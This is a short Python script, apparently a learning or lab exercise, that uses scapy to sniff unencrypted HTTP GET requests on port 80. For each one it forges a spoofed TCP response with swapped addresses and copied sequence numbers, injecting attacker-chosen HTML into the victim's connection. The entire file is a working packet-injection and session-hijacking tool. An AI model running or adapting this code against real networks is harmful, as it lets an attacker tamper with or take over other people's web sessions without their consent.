#!/usr/bin/env python3

from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
import sys


class tcp_html_session_hijack:
    def execute():
        print("Listening for http GET requests...")
        sniff(prn=tcp_html_session_hijack.inject, filter='tcp port 80', lfilter=lambda p: p.haslayer(HTTPRequest)) # is a HTTP packet) 

    def inject(t):
        Ether_Packet = Ether(src=t[Ether].dst, dst=t[Ether].src) # switch ethernet direction
        IP_Packet = IP()
        IP_Packet.src = t[IP].dst
        IP_Packet.dst = t[IP].src
        TCP_Packet = TCP()	
        # from destination port
        TCP_Packet.sport = int(t[TCP].dport)
        # to originating port
        TCP_Packet.dport = int(t[TCP].sport)
        TCP_Packet.seq = int(t[TCP].ack)
        TCP_Packet.ack = int(t[TCP].seq + 1)
        TCP_Packet.flags ="AP"
        #seq=p[TCP].ack, ack=p[TCP].seq + 1, flags="AP"
		# set reset
		# ok so packet sequence etc is very important, but what if we maipulate that sequence to be something we want?
        # create http response
        myhtml = "<h1>My injected response</h1>"
        response = myhtml
        inject_packet = Ether_Packet/ IP_Packet / TCP_Packet / response # forge response packet with my html in it
        print('Spoofed Response: ' + str(inject_packet[IP].src) + '->' + str(inject_packet[IP].dst))
        sendp(inject_packet) # send spoofed response
        sys.stdout.write("Injection packet sent!\n")